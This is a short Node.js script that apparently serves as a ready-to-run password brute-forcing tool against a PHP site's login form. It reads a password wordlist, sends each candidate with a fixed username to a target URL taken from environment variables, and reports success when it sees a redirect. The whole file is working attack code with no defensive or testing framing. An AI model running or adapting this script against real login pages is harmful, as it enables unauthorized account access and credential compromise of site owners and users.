import { readFile } from 'fs/promises';
import fetch from 'node-fetch';
import { URLSearchParams } from 'url';
import dotenv from 'dotenv';
dotenv.config();

const raw = await readFile(process.env.FILE_ATTACK, 'utf-8');
const data = JSON.parse(raw);

const url = process.env.URL_ATTACK;
const username = process.env.USERNAME_ATTACK;

// Brut-force Attack for PHP website / app
for (let i = 0; i < data.length; i++) {
    const password = data[i];
    console.log(`Trying: ${password}`);

    const body = new URLSearchParams();
    body.append('login', username);
    body.append('password', password);
    body.append('form', 'submit');

    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: body.toString(),
            redirect: 'manual' 
        });

        if (res.status === 302 || res.headers.get('location')?.includes('portal')) {
            console.log('😈 Correct password found:', password);
            break;
        } else {
            console.log(i, ') Password failed with:', password);
        }

        await new Promise(r => setTimeout(r, 200));
    } catch (err) {
        console.error('🤬 Error:', err);
    }
}
